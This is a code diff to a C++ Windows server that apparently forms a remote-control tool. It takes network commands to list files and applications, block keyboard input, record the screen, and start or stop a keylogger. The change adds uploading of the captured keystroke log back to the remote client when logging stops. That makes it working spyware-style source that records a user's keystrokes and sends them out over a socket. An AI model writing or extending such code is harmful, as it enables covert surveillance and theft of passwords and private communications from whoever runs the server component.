@@ -4,8 +4,8 @@ std::unordered_map<std::string, MessageType> ServerSocket::messageMap;
 
 ServerSocket::ServerSocket() : 
     winAPI(new WinAPI()), 
-    isKeyboardDisabled(false), 
-    keylogger(new Keylogger("default_log.txt")),
+    keyloggerFilePath("./output-server/default_log.txt"),
+    keylogger(new Keylogger()),
     keyboardDisabler(new KeyboardDisabler())
 {
 
@@ -64,7 +64,8 @@ ServerSocket::ServerSocket() :
         {"listInstalledApp", LIST_INSTALLED_APP},
         {"listFiles", LIST_FILES},
         {"disableKeyboard", DISABLE_KEYBOARD},
-        {"keylogger", KEY_LOGGER},
+        {"enableKeyboard", ENABLE_KEYBOARD},
+        {"enableKeylogger", ENABLE_KEYLOGGER},
         {"disableKeylogger", DISABLE_KEYLOGGER},
         {"screenRecording", SCREEN_RECORDING}
     };
@@ -78,8 +79,6 @@ ServerSocket::~ServerSocket()
     WSACleanup();
     delete winAPI;
     delete keylogger;
-    if (keyloggerThread.joinable())
-        keyloggerThread.join();
 }
 
 MessageType ServerSocket::hashMessage(const std::string message) {
@@ -315,26 +314,20 @@ void ServerSocket::initializeHandlers() {
         sendResponse(clientSocket, "Keyboard and mouse input enabled successfully.");
     };
 
-    handlers[KEY_LOGGER] = [this](SOCKET &clientSocket, const std::string& command) {
-        auto tokens = parseCommand(command);
-        if (tokens.size() != 2) {
-            sendResponse(clientSocket, "Usage: keylogger <path/to/file>");
-            return;
-        }
+    handlers[ENABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {        
+        std::string fileName = winAPI->generateName("keylogger", "txt");
+        keyloggerFilePath = "./output-server/" + fileName;
+        
+        keylogger->start(keyloggerFilePath);
 
-        const std::string filename = tokens[1];
-
-        keylogger->setPath(filename);
-        keyloggerThread = std::thread([this]() { keylogger->captureKey(); });
-
-        sendResponse(clientSocket, "Keylogger started, logging to " + filename);
+        sendResponse(clientSocket, "Keylogger started, logging to " + keyloggerFilePath);
     };
 
     handlers[DISABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {
         keylogger->stop();
-        if (keyloggerThread.joinable())
-            keyloggerThread.join();
         sendResponse(clientSocket, "Keylogger stopped.");
+
+        sendFile(clientSocket, keyloggerFilePath);
     };
 
     handlers[SCREEN_RECORDING] = [this](SOCKET &clientSocket, const std::string& command) {
